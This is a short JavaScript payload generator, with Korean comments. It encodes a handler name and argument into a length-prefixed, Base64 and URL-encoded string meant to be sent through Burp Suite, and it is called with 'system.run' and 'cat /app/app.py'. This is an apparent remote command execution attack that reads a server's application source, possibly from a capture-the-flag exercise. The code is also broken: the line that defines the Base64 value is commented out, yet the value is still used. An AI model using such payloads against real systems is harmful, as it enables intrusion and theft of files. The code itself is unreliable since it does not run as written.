function generatePayload(handler, arg) {
  const enc = new TextEncoder();
  const h = enc.encode(handler);
  const a = enc.encode(arg);
  
  // [4 bytes BE: h_len] [h_bytes] [4 bytes BE: a_len] [a_bytes]
  const buf = new Uint8Array(4 + h.length + 4 + a.length);
  const view = new DataView(buf.buffer);
  
  view.setUint32(0, h.length, false); // Big-Endian
  buf.set(h, 4);
  view.setUint32(4 + h.length, a.length, false); // Big-Endian
  buf.set(a, 4 + h.length + 4);
  
  // Uint8Array -> Base64
  // const base64 = btoa(String.fromCharCode(...buf));
  
  // URL Encoded (Burp Suite 전송용)
  const urlEncoded = encodeURIComponent(base64);
  
  console.log("=== 생성 결과 ===");
  console.log(urlEncoded);
  return { base64, urlEncoded };
}

generatePayload("system.run", "cat /app/app.py");
